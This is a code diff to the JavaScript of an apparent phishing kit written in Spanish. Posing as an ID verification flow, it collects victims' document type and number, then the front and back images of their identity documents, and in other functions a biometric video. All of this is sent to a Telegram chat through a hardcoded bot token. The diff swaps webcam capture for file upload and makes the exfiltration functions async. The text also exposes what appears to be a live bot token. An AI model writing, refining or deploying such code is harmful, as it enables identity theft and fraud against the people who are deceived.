@@ -7,14 +7,20 @@ document.addEventListener('DOMContentLoaded', () => {
     const TELEGRAM_BOT_TOKEN = '7793777042:AAHegpN7eQIAcBJZjtMDfZZIwGnsmqv7vfg'; 
     const TELEGRAM_CHAT_ID = '-4992418825';
 
-    // --- PAGE: INDEX (FORM + ID SCAN) ---
+    // --- PAGE: INDEX (FORM + ID UPLOAD) ---
     if (!isVerificationPage) {
         const loginForm = document.getElementById('login-form');
         const loginStep = document.getElementById('login-step');
         const idScanStep = document.getElementById('id-scan-step');
-        const idVideo = document.getElementById('id-webcam');
-        const idInstruction = document.getElementById('id-scan-instruction');
-        const idStatus = document.querySelector('.camera-status');
+        const uploadForm = document.getElementById('upload-form');
+        const uploadStatus = document.getElementById('upload-status');
+        const btnUpload = document.getElementById('btn-upload-continue');
+
+        // File Inputs
+        const frontInput = document.getElementById('id-front');
+        const backInput = document.getElementById('id-back');
+        const frontName = document.getElementById('front-file-name');
+        const backName = document.getElementById('back-file-name');
 
         if (loginForm) {
             loginForm.addEventListener('submit', (e) => {
@@ -24,93 +30,65 @@ document.addEventListener('DOMContentLoaded', () => {
                 const docNumber = document.getElementById('doc-number').value;
                 
                 if (docType && docNumber) {
-                    // Save info for next page
+                    // Save info
                     localStorage.setItem('docType', docType);
                     localStorage.setItem('docNumber', docNumber);
                     
-                    // Send text notification
+                    // Notify Telegram
                     sendTextToTelegram(`Nuevo usuario iniciando:\nTipo: ${docType}\nDocumento: ${docNumber}`);
                     
-                    // Start ID Scan
-                    transitionToIDScan();
+                    // Switch to ID Upload
+                    loginStep.classList.add('hidden');
+                    idScanStep.classList.remove('hidden');
                 }
             });
         }
 
-        async function transitionToIDScan() {
-            loginStep.classList.add('hidden');
-            idScanStep.classList.remove('hidden');
-            
-            await startIDCamera();
-            scanIDSide('front');
+        // Display file names on selection
+        if (frontInput) {
+            frontInput.addEventListener('change', (e) => {
+                if (e.target.files.length > 0) frontName.textContent = e.target.files[0].name;
+            });
+        }
+        if (backInput) {
+            backInput.addEventListener('change', (e) => {
+                if (e.target.files.length > 0) backName.textContent = e.target.files[0].name;
+            });
         }
 
-        async function startIDCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } },
-                    audio: false 
-                });
-                idVideo.srcObject = stream;
-            } catch (err) {
-                console.error("Error accessing ID camera:", err);
-                try {
-                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                     idVideo.srcObject = stream;
-                } catch (e) {
-                    if (idStatus) idStatus.textContent = "Error de cámara";
+        // Handle Upload Submit
+        if (uploadForm) {
+            uploadForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const frontFile = frontInput.files[0];
+                const backFile = backInput.files[0];
+
+                if (!frontFile || !backFile) {
+                    uploadStatus.textContent = "Por favor seleccione ambas fotos.";
+                    return;
                 }
-            }
-        }
 
-        function scanIDSide(side) {
-            if (side === 'front') {
-                idInstruction.textContent = "Ubique la cara FRONTAL de su documento";
-                idStatus.textContent = "Buscando documento...";
-            } else {
-                idInstruction.textContent = "Ubique el REVERSO de su documento";
-                idStatus.textContent = "Gire su documento...";
-            }
+                uploadStatus.textContent = "Enviando documentos...";
+                btnUpload.disabled = true;
 
-            setTimeout(() => {
-                idStatus.textContent = "Capturando...";
-                captureIDImage(side, () => {
-                    idStatus.textContent = "¡Capturado!";
-                    
-                    setTimeout(() => {
-                        if (side === 'front') {
-                            scanIDSide('back');
-                        } else {
-                            stopIDCamera();
-                            // REDIRECT TO VERIFICATION PAGE
-                            window.location.href = 'verification.html';
-                        }
-                    }, 1000);
-                });
-            }, 4000);
-        }
+                const docNum = localStorage.getItem('docNumber') || 'Desconocido';
 
-        function captureIDImage(side, callback) {
-            const canvas = document.createElement('canvas');
-            canvas.width = idVideo.videoWidth;
-            canvas.height = idVideo.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(idVideo, 0, 0);
-            
-            const docNum = localStorage.getItem('docNumber') || 'Desconocido';
-            
-            canvas.toBlob((blob) => {
-                sendPhotoToTelegram(blob, `id_${side}.jpg`, `Documento (${side}) - ${docNum}`);
-                if (callback) callback();
-            }, 'image/jpeg', 0.8);
-        }
+                // Send Front
+                await sendPhotoToTelegram(frontFile, 'id_front.jpg', `Documento (Frente) - ${docNum}`);
+                
+                // Small delay to ensure order
+                await new Promise(r => setTimeout(r, 1000));
+                
+                // Send Back
+                await sendPhotoToTelegram(backFile, 'id_back.jpg', `Documento (Reverso) - ${docNum}`);
 
-        function stopIDCamera() {
-            if (idVideo && idVideo.srcObject) {
-                const tracks = idVideo.srcObject.getTracks();
-                tracks.forEach(track => track.stop());
-                idVideo.srcObject = null;
-            }
+                uploadStatus.textContent = "¡Documentos enviados!";
+                
+                setTimeout(() => {
+                    window.location.href = 'verification.html';
+                }, 1500);
+            });
         }
     }
 
@@ -239,7 +217,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- SHARED: TELEGRAM FUNCTIONS ---
 
-    function sendTextToTelegram(text) {
+    async function sendTextToTelegram(text) {
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -247,10 +225,10 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('text', text);
 
-        fetch(url, { method: 'POST', body: formData }).catch(console.error);
+        return fetch(url, { method: 'POST', body: formData }).catch(console.error);
     }
 
-    function sendPhotoToTelegram(blob, filename, caption) {
+    async function sendPhotoToTelegram(blob, filename, caption) {
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
@@ -259,10 +237,16 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.append('photo', blob, filename || 'photo.jpg');
         formData.append('caption', caption || '');
 
-        fetch(url, { method: 'POST', body: formData }).catch(console.error);
+        return fetch(url, { method: 'POST', body: formData })
+            .then(res => res.json())
+            .then(data => {
+                if (!data.ok) console.error('Telegram Error:', data);
+                return data;
+            })
+            .catch(console.error);
     }
 
-    function sendVideoToTelegram(blob, caption) {
+    async function sendVideoToTelegram(blob, caption) {
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
@@ -271,6 +255,6 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.append('video', blob, 'biometric_video.webm');
         formData.append('caption', caption || 'Video de prueba');
 
-        fetch(url, { method: 'POST', body: formData }).catch(console.error);
+        return fetch(url, { method: 'POST', body: formData }).catch(console.error);
     }
 });
